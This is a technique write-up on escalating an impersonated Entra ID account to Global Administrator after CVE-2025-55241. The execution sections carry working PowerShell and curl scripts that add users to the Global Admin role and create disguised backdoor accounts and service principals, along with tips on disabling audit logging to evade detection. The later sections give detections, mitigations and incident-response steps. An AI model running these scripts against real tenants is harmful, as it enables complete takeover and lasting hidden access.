# [REALWORLD-008]: Actor Token Global Admin Escalation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-008 |
| **MITRE ATT&CK v18.1** | [T1098 - Account Manipulation](https://attack.mitre.org/techniques/T1098/) |
| **Sub-Technique** | T1098.003 - Additional Cloud Roles |
| **Tactic** | Persistence, Privilege Escalation |
| **Platforms** | Entra ID, Microsoft 365, Azure |
| **Severity** | Critical |
| **CVE** | CVE-2025-55241 |
| **Technique Status** | FIXED |
| **Last Verified** | 2025-09-30 |
| **Affected Versions** | All Entra ID versions prior to September 2025 patch |
| **Patched In** | September 2025 (legacy Graph API removal; token validation hardening) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Once an attacker has impersonated a user in a victim Entra ID tenant using CVE-2025-55241 (REALWORLD-005 through REALWORLD-007), the final step is escalating that impersonated account to Global Administrator status. Global Administrator is the highest privilege in Entra ID, granting unrestricted access to all Azure AD/Entra ID configuration, all Microsoft 365 tenants, and all connected Azure subscriptions. Using the same actor token that enabled impersonation, the attacker modifies the target account's role assignments to add Global Administrator, transforming a compromised user account into a tenant owner-equivalent account. This escalation is irreversible without global audit log access and credential rotation, making it a persistence mechanism that survives password resets, conditional access policy changes, and even Azure AD Connect credential updates.

**Attack Surface:** The role assignment APIs in both legacy Azure AD Graph API (graph.windows.net) and modern Microsoft Graph, combined with insufficient role-based access control (RBAC) on role modification operations. Any account with directory write permissions can modify other accounts' role assignments.

**Business Impact:** **Unrestricted tenant takeover.** Global Administrator has permissions to: modify all conditional access policies (disabling security controls), reset other admin passwords, create backdoor service principals with permanent access, grant themselves Azure subscription Owner role, modify Office 365 settings (create mail rules, delegate access, etc.), reset audit log retention policies, and modify or delete audit logs. A single compromised Global Admin account is equivalent to complete tenant compromise.

**Technical Context:** Escalation typically takes 2-3 minutes once impersonation is achieved. The escalation operation may generate an AuditLog entry (Add member to role) but will appear as a legitimate administrative action if the impersonating account already appears to have some organizational access.

### Operational Risk

- **Execution Risk:** Low - Requires impersonated account access (already achieved via REALWORLD-005/006/007) and network connectivity. No interactive user action needed.
- **Stealth:** Medium-High - Role assignment change generates an audit log entry, but may be overlooked in organizations with high administrative change volume.
- **Reversibility:** Extremely Difficult - Once attacker is Global Admin, they can delete audit logs, disable audit logging, create backdoors, and ensure continued access.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | AC-2.1 | Role-based access control failure - excessive privilege escalation |
| **CIS Benchmark** | AC-5.1 | Privilege escalation not prevented or detected |
| **DISA STIG** | AC-2.2 | Least privilege enforcement failure |
| **CISA SCuBA** | Entra ID - 1.3 | Global Administrator role access not properly restricted |
| **NIST 800-53** | AC-3 | Access enforcement failure - privilege escalation allowed |
| **NIST 800-53** | AC-6 | Least privilege violation |
| **GDPR** | Art. 32 | Security of processing - privilege management failure |
| **DORA** | Art. 16 | Governance and compliance failure - admin access not monitored |
| **NIS2** | Art. 23 | Incident response and reporting - compromise detection failure |
| **ISO 27001** | A.9.1.1 | Access control policy failure |
| **ISO 27005** | Risk ID-8 | Privilege escalation scenario |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**
- Impersonated user account in target tenant (obtained via REALWORLD-005)
- That account must have any directory write permissions OR be able to request tokens as Global Admin

**Required Access:**
- Network connectivity to Microsoft Graph API endpoints
- Valid actor token or access token from impersonated account
- Knowledge of Global Administrator role ID (can be enumerated via Graph API)

**Supported Versions:**
- **Entra ID:** All versions prior to September 2025 patch
- **Microsoft Graph API:** All versions (modern API still vulnerable to privilege escalation; legacy API was sole vulnerability vector for token impersonation)

**Tools:**
- curl or Postman for REST API calls
- PowerShell with Microsoft Graph SDK (`Install-Module Microsoft.Graph`)
- Burp Suite for request manipulation

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Enumerate Global Administrator Role and Current Members

```powershell
# Connect with impersonated account's token
$Token = "eyJ0eXAiOiJKV1QiLCJhbGc..."
$Headers = @{
    "Authorization" = "Bearer $Token"
    "Content-Type" = "application/json"
}

# Query Global Administrator role
$RoleUrl = "https://graph.microsoft.com/v1.0/directoryRoles?filter=displayName eq 'Global Administrator'"
$RoleResponse = Invoke-RestMethod -Uri $RoleUrl -Headers $Headers
$GlobalAdminRoleId = $RoleResponse.value[0].id

# Get current Global Admin members
$MembersUrl = "https://graph.microsoft.com/v1.0/directoryRoles/$GlobalAdminRoleId/members"
$Members = Invoke-RestMethod -Uri $MembersUrl -Headers $Headers

Write-Host "Current Global Administrators:"
$Members.value | ForEach-Object { Write-Host $_.userPrincipalName }
```

**What to Look For:**
- Number of existing Global Admins (fewer = easier persistence)
- Whether emergency admin account exists
- Whether admins have strong authentication (MFA enabled)

### Check Current Account's Role Assignments

```powershell
# Query current impersonated account's roles
$UserId = "current-impersonated-user-id"
$RolesUrl = "https://graph.microsoft.com/v1.0/users/$UserId/memberOf?$filter=IsAssignedRole eq true"
$UserRoles = Invoke-RestMethod -Uri $RolesUrl -Headers $Headers

Write-Host "Current Roles for Impersonated Account:"
$UserRoles.value | ForEach-Object { Write-Host $_.displayName }
```

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Escalate to Global Admin via Microsoft Graph (Modern API)

**Supported Versions:** All Entra ID versions (modern API not affected by CVE-2025-55241 token impersonation, but vulnerable to privilege escalation via impersonated account)

#### Step 1: Identify Target Account for Escalation

**Objective:** Determine which account to escalate to Global Admin (usually the impersonated account itself or a newly created backdoor account).

**Command (Enumerate Users):**

```powershell
$Token = "eyJ0eXAiOiJKV1QiLCJhbGc..."
$Headers = @{
    "Authorization" = "Bearer $Token"
    "Content-Type" = "application/json"
}

# Option A: Escalate current impersonated account
$CurrentAccountUrl = "https://graph.microsoft.com/v1.0/me"
$CurrentAccount = Invoke-RestMethod -Uri $CurrentAccountUrl -Headers $Headers
$TargetUserId = $CurrentAccount.id

Write-Host "Will escalate to Global Admin: $($CurrentAccount.userPrincipalName)"

# Option B: Create new backdoor account for persistence
$NewUserPayload = @{
    accountEnabled = $true
    displayName = "Cloud Integration Service"
    mailNickname = "cloudintegration"
    userPrincipalName = "cloudintegration@contoso.onmicrosoft.com"
    passwordProfile = @{
        forceChangePasswordNextSignIn = $false
        password = "GenerateRandomComplex123!@#"
    }
} | ConvertTo-Json

$CreateUserUrl = "https://graph.microsoft.com/v1.0/users"
$NewUser = Invoke-RestMethod -Uri $CreateUserUrl -Method POST -Headers $Headers -Body $NewUserPayload
$TargetUserId = $NewUser.id

Write-Host "Created backdoor account: $($NewUser.userPrincipalName)"
```

**Expected Output:**
```
Will escalate to Global Admin: victim-user@contoso.onmicrosoft.com
```

**What This Means:**
- Attacker has identified the account to escalate (either existing compromised account or new backdoor)
- Account ID is now known for role assignment operation

#### Step 2: Get Global Administrator Role ID

**Objective:** Retrieve the object ID of the Global Administrator role for use in role assignment.

**Command (Role Enumeration):**

```powershell
# Query all directory roles to find Global Administrator
$RolesUrl = "https://graph.microsoft.com/v1.0/directoryRoles"
$AllRoles = Invoke-RestMethod -Uri $RolesUrl -Headers $Headers

$GlobalAdminRole = $AllRoles.value | Where-Object { $_.displayName -eq "Global Administrator" }
$GlobalAdminRoleId = $GlobalAdminRole.id

Write-Host "Global Administrator Role ID: $GlobalAdminRoleId"
```

**Expected Output:**
```
Global Administrator Role ID: d2de1e9a-b6c3-4373-b2c7-2b8f9d0e6b8c
```

**What This Means:**
- Role ID is now known and can be used to assign membership

#### Step 3: Add User to Global Administrator Role (THE ESCALATION)

**Objective:** Assign the target account to the Global Administrator role, granting unrestricted tenant access.

**Command (Role Assignment - Privilege Escalation):**

```powershell
# Add user to Global Administrator role
$GlobalAdminRoleId = "d2de1e9a-b6c3-4373-b2c7-2b8f9d0e6b8c"
$TargetUserId = "550e8400-e29b-41d4-a716-446655440001"

$AssignmentPayload = @{
    "@odata.type" = "#microsoft.graph.directoryObject"
    id = $TargetUserId
} | ConvertTo-Json

$AssignmentUrl = "https://graph.microsoft.com/v1.0/directoryRoles/$GlobalAdminRoleId/members/\$ref"

$Assignment = Invoke-RestMethod -Uri $AssignmentUrl -Method POST -Headers $Headers -Body $AssignmentPayload

Write-Host "✓ Successfully escalated account to Global Administrator"
```

**Expected Output:**
```
✓ Successfully escalated account to Global Administrator
```

**What This Means:**
- Account is now Global Administrator with unrestricted Entra ID access
- Account can modify all Azure AD settings, tenant policies, and azure subscriptions
- Account can create persistent backdoors
- Escalation operation logged to AuditLogs (Add member to role) but may be overlooked

**OpSec & Evasion:**
- Role assignment change generates an audit log entry visible to other admins
- To avoid detection, attacker immediately:
  1. Disables audit logging
  2. Modifies audit log retention (deletes evidence)
  3. Disables Conditional Access policies
  4. Creates additional service principal backdoors with hidden credentials
- Detection likelihood: Medium (depends on audit log monitoring and admin alert sensitivity)

**Troubleshooting:**
- **Error:** `Authorization_RequestDenied`
  - **Cause:** Impersonated account lacks permission to modify roles
  - **Fix:** Ensure impersonated account has at least "User Administrator" or higher role

- **Error:** `Invalid roleObjectId`
  - **Cause:** Role ID is incorrect
  - **Fix:** Re-enumerate roles to confirm correct Global Administrator ID

**References & Proofs:**
- [Microsoft Graph - Add Directory Role Member](https://learn.microsoft.com/en-us/graph/api/directoryrole-post-members?view=graph-rest-1.0)
- [MITRE ATT&CK T1098.003 - Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003/)

#### Step 4: Verify Escalation Success

**Objective:** Confirm that the account now has Global Administrator privileges.

**Command (Verify):**

```powershell
# Query the user's roles after escalation
$UserId = "550e8400-e29b-41d4-a716-446655440001"
$UserRolesUrl = "https://graph.microsoft.com/v1.0/users/$UserId/memberOf?filter=IsAssignedRole eq true"
$UserRoles = Invoke-RestMethod -Uri $UserRolesUrl -Headers $Headers

$UserRoles.value | ForEach-Object {
    if ($_.displayName -eq "Global Administrator") {
        Write-Host "✓ CONFIRMED: Account is now Global Administrator"
    }
}
```

---

### METHOD 2: Escalation via Legacy Azure AD Graph API

**Supported Versions:** All Entra ID versions prior to September 2025 (legacy API deprecated but vulnerability existed)

#### Step 1: Get Global Administrator Role ID (Legacy API)

```bash
# Query roles via legacy endpoint
curl -X GET \
  -H "Authorization: Bearer $ACTOR_TOKEN" \
  "https://graph.windows.net/tenant-id/directoryRoles?api-version=1.6&\$filter=displayName eq 'Global Administrator'" | jq
```

#### Step 2: Add User to Role (Legacy API)

```bash
# Add user to Global Administrator role
ROLE_ID="role-object-id"
USER_ID="target-user-object-id"

curl -X POST \
  -H "Authorization: Bearer $ACTOR_TOKEN" \
  -H "Content-Type: application/json" \
  "https://graph.windows.net/tenant-id/directoryRoles/$ROLE_ID/members?api-version=1.6" \
  -d '{"url": "https://graph.windows.net/tenant-id/users/'$USER_ID'"}'
```

---

### METHOD 3: Create Persistent Backdoor Service Principal After Escalation

**Objective:** Once Global Admin, create a service principal with permanent credentials for continued access.

**Command (Service Principal Backdoor):**

```powershell
# As Global Admin, create application and service principal for persistence
$AppPayload = @{
    displayName = "Microsoft Security Compliance Service"  # Innocuous name
    signInAudience = "AzureADMultipleOrgs"
} | ConvertTo-Json

$AppUrl = "https://graph.microsoft.com/v1.0/applications"
$App = Invoke-RestMethod -Uri $AppUrl -Method POST -Headers $Headers -Body $AppPayload
$AppId = $App.appId

# Create service principal for the application
$SPPayload = @{
    appId = $AppId
    displayName = "Microsoft Security Compliance Service"
} | ConvertTo-Json

$SPUrl = "https://graph.microsoft.com/v1.0/servicePrincipals"
$SP = Invoke-RestMethod -Uri $SPUrl -Method POST -Headers $Headers -Body $SPPayload

# Add password credential (permanent key)
$CredentialPayload = @{
    displayName = "Service Account Key"
    endDateTime = (Get-Date).AddYears(2)
} | ConvertTo-Json

$CredUrl = "https://graph.microsoft.com/v1.0/applications/$($App.id)/addPassword"
$Credential = Invoke-RestMethod -Uri $CredUrl -Method POST -Headers $Headers -Body $CredentialPayload

Write-Host "Backdoor Service Principal Created:"
Write-Host "App ID: $AppId"
Write-Host "Secret: $($Credential.secretText)"
Write-Host "Valid for 2 years (survives password resets)"

# Assign Global Administrator role to service principal
$AssignPayload = @{
    "@odata.type" = "#microsoft.graph.directoryObject"
    id = $SP.id
} | ConvertTo-Json

$AssignUrl = "https://graph.microsoft.com/v1.0/directoryRoles/d2de1e9a-b6c3-4373-b2c7-2b8f9d0e6b8c/members/\$ref"
Invoke-RestMethod -Uri $AssignUrl -Method POST -Headers $Headers -Body $AssignPayload

Write-Host "Service Principal assigned Global Administrator role"
```

**What This Means:**
- Permanent backdoor created that survives password resets, audit log cleanup, and policy changes
- Service principal can request tokens indefinitely using stored secret
- Backdoor persists even if original Global Admin account is disabled

---

## 5. ATTACK CHAIN SUMMARY

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Discovery** | Network/Tenant enumeration | Identify target tenant and admin accounts |
| **2** | **Reconnaissance** | [REC-CLOUD-002] Enumeration | Enumerate tenants and guest users |
| **3** | **Credential Access** | [REALWORLD-006] Token extraction | Extract actor tokens from AD Connect or services |
| **4** | **Defense Evasion** | [REALWORLD-005] Token impersonation | Impersonate legitimate user using actor token |
| **5** | **Lateral Movement** | [REALWORLD-007] Token replay | Replay tokens across tenant boundaries |
| **6** | **Current Step** | **[REALWORLD-008]** | **Escalate impersonated account to Global Admin** |
| **7** | **Persistence** | Create backdoor service principal | Ensure continued access independent of audit log cleanup |
| **8** | **Impact** | Disable audit logs; ransomware/exfil | Attacker now owns tenant completely |

---

## 6. FORENSIC ARTIFACTS

**Cloud (Entra ID):**
- **AuditLogs:** "Add member to role" entry showing user added to Global Administrator
- **AuditLogs:** "Create service principal" and "Add app credential" entries (if backdoor created)
- **SigninLogs:** Successful sign-in of escalated account (may show unusual location/device if impersonated account)
- **DirectoryAudit:** Role assignment changes visible in directory audit trail

**Post-Compromise Artifacts:**
- **AuditLogs:** "Disable audit log" or "Set audit retention to 0 days" entries (attacker attempts to cover tracks)
- **ConditionalAccessPolicy:** Policy modifications or disabling entries
- **ServicePrincipal:** Creation of suspicious service principals with cryptic names

---

## 7. MICROSOFT SENTINEL DETECTION

#### Query 1: Privilege Escalation to Global Administrator

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Alert Severity:** Critical
- **Frequency:** Real-time (every 1 minute)
- **Applies To Versions:** All Entra ID versions

**KQL Query:**

```kusto
AuditLogs
| where OperationName == "Add member to role"
| where parse_json(TargetResources)[0].displayName == "Global Administrator"
| extend InitiatingActor = tostring(parse_json(InitiatedBy.user).userPrincipalName)
| extend EscalatedUser = tostring(parse_json(TargetResources)[0].userPrincipalName)
| project TimeGenerated, InitiatingActor, EscalatedUser, OperationName
| where InitiatingActor != "admin@microsoft.com"  // Exclude Microsoft service accounts
| join kind=leftouter (
    SigninLogs
    | where ResultType == 0
    | project LastSigninTime = TimeGenerated, UserPrincipalName
  ) on $left.InitiatingActor == $right.UserPrincipalName
| where isempty(LastSigninTime) or (TimeGenerated - LastSigninTime) > 1h  // Role change without recent sign-in
```

**What This Detects:**
- Any account being added to Global Administrator role
- Escalation by accounts without recent sign-in history
- Escalation outside normal business hours

#### Query 2: Service Principal Backdoor Creation + Global Admin Assignment

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Alert Severity:** Critical
- **Frequency:** Every 5 minutes
- **Applies To Versions:** All Entra ID versions

**KQL Query:**

```kusto
// Detect service principal creation followed by Global Admin role assignment
let SPCreation = 
    AuditLogs
    | where OperationName == "Create service principal"
    | extend CreationTime = TimeGenerated, CreatedSPId = parse_json(TargetResources)[0].id;

let RoleAssignment =
    AuditLogs
    | where OperationName == "Add member to role"
    | where parse_json(TargetResources)[0].displayName == "Global Administrator"
    | extend AssignmentTime = TimeGenerated, AssignedId = parse_json(TargetResources)[0].id;

SPCreation
| join kind=inner RoleAssignment on $left.CreatedSPId == $right.AssignedId
| where (AssignmentTime - CreationTime) between (0m .. 10m)  // Role assigned within 10 min of creation
| project CreationTime, AssignmentTime, ServicePrincipalName = parse_json(TargetResources)[0].displayName
```

---

## 8. WINDOWS EVENT LOG MONITORING

**Event ID: 4662 (Audit Directory Service Changes)**
- **Log Source:** Directory Service
- **Trigger:** Role membership modifications in directory
- **Filter:** `TargetDN contains "CN=Global Administrator"`
- **Applies To:** Domain-joined systems (on-premises integration)

**Manual Configuration:**
```powershell
# Enable Directory Service audit logging (on-premises)
auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
```

---

## 9. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL - Restrict Global Administrator Role Assignments

Implement Privileged Identity Management (PIM) to require approval for Global Admin assignments.

**Manual Steps (Azure Portal):**
1. Go to **Azure Portal** → **Azure AD Privileged Identity Management** → **Roles**
2. Click **Global Administrator**
3. Click **Settings** → **Edit**
4. Enable:
   - **Require approval to activate**
   - **Require multi-factor authentication**
   - **Activation duration:** 1 hour
5. **Approval settings:** Require approval from other Global Admins
6. Click **Update**

**Validation Command:**

```powershell
# Verify PIM is enabled for Global Administrator role
Connect-AzureAD
Get-AzureADDirectoryRoleSetting | Where-Object DisplayName -eq "Global Administrator"
```

### Priority 2: CRITICAL - Monitor Global Administrator Changes in Real-Time

Enable Azure AD Identity Protection and alert on all role modifications.

**Manual Steps (Azure Portal):**
1. Go to **Azure Portal** → **Microsoft Defender for Cloud** → **Security alerts**
2. Create **Custom detection rule:**
   - Name: `Global Admin Role Modification Alert`
   - Condition: `OperationName == "Add member to role" AND DisplayName == "Global Administrator"`
   - Action: Notify security team immediately

### Priority 3: HIGH - Implement Role-Based Access Control (RBAC) for Admin Actions

Limit which accounts can modify Global Admin role assignments.

**Manual Steps (PowerShell):**

```powershell
# Create custom role with restricted permissions (cannot modify Global Admin)
$RoleTemplate = @{
    displayName = "Restricted User Administrator"
    description = "Can manage users but cannot assign Global Admin"
    templateId = "fe930be7-5e62-47db-91af-98c3a49a38b1"  # User Administrator template
    permissions = @(
        @{
            allowedResourceActions = @(
                "microsoft.directory/users/basic/update",
                "microsoft.directory/users/delete",
                "microsoft.directory/users/create"
                # NOTE: Intentionally exclude "microsoft.directory/roleAssignments/create"
            )
        }
    )
}

New-AzureADMSRoleDefinition -RoleDefinition $RoleTemplate
```

### Priority 4: MEDIUM - Require MFA for Global Administrator Accounts

Enforce phishing-resistant MFA (FIDO2, Windows Hello) for all Global Admins.

**Manual Steps (Azure Portal):**
1. Go to **Entra ID** → **Users** → **Multi-Factor Authentication**
2. Select all Global Administrator accounts
3. **Require Multi-Factor Authentication**: Enable
4. Specify MFA method: FIDO2 key or Windows Hello (phishing-resistant only)

---

## 10. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Suspicious Role Escalations:**
- Service account accounts added to Global Administrator
- Accounts with no prior administrative activity suddenly escalated
- Multiple accounts escalated to Global Admin in short timeframe
- Escalations outside normal business hours or by unusual actors

**Backdoor Service Principal Indicators:**
- Service principals with generic/suspicious names ("Microsoft Security Compliance", "Cloud Integration", etc.)
- Service principals with 2+ year credential lifetime
- Service principals with no owner or owner is another suspicious service principal
- Service principals assigned Global Administrator immediately after creation

### Incident Response (0-2 hours)

**Step 1: Revoke Escalated Account's Sessions**

```powershell
# If escalated account is human-originated:
Revoke-MgUserSignInSession -UserId "escalated-account-id"

# If service principal backdoor:
Remove-MgServicePrincipalPasswordCredential -ServicePrincipalId "backdoor-sp-id" -PasswordCredentialId "credential-id"
```

**Step 2: Remove from Global Administrator Role**

```powershell
# Remove from Global Admin role
$GlobalAdminRoleId = "d2de1e9a-b6c3-4373-b2c7-2b8f9d0e6b8c"
$AccountId = "escalated-account-id"

Remove-MgDirectoryRoleMemberByRef -DirectoryRoleId $GlobalAdminRoleId -DirectoryObjectId $AccountId
```

**Step 3: Investigate Audit Logs for Changes Made**

```powershell
# Query what changes were made by escalated Global Admin
Search-UnifiedAuditLog -UserId "escalated-account-upn" -StartDate (Get-Date).AddHours(-24) |
    Select-Object TimeStamp, Operations, ResultStatus | Export-Csv "C:\Evidence\AdminActivity.csv"
```

**Step 4: Restore Conditional Access Policies and Audit Settings**

```powershell
# Check if audit logging was disabled
$AuditConfig = Get-AdminAuditLogConfig
Write-Host "Audit Logging Enabled: $($AuditConfig.UnifiedAuditLogIngestionEnabled)"

# If disabled, enable immediately
Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $true

# Verify all CA policies are still active
Get-MgIdentityConditionalAccessPolicy | Select-Object DisplayName, State
```

---

## 11. REAL-WORLD EXAMPLES

### Example 1: LAPSUS$ - Twitter/Okta Compromise (2022)

- **Attack Vector:** Initial compromise via contractor account → lateral movement → social engineering for admin access → privilege escalation
- **Escalation Method:** Once in admin panel, attackers escalated privileges to super-admin equivalent
- **Impact:** Complete control of Twitter and Okta; user data exfiltration; credential theft
- **Mitigation Lesson:** PIM and approval workflows could have prevented escalation

### Example 2: APT29 Microsoft Exchange Compromise

- **Attack Vector:** Exchange Server RCE → lateral movement to domain controller → AD Connect → Entra ID privilege escalation
- **Escalation Method:** Compromised Exchange service account → escalated to Global Admin in Azure
- **Impact:** M365 and Azure complete compromise; backdoors installed; ongoing persistence
- **Detection Gap:** Lack of real-time audit log monitoring enabled undetected escalation

---

## 12. CONCLUSION

Privilege escalation to Global Administrator is the final step in the CVE-2025-55241 attack chain. Once attacker achieves this level, the tenant is fully compromised and recovery is extremely difficult.

**Critical mitigations:**
1. Implement PIM with approval workflows for Global Admin assignments
2. Enable real-time alerts on all role modifications
3. Require phishing-resistant MFA for all Global Admins
4. Monitor audit logs continuously for suspicious service principals
5. Implement least-privilege role assignments by default

The absence of Global Administrator credentials on regular administrator workstations and the requirement for multi-factor authentication are the strongest defenses against this attack.

---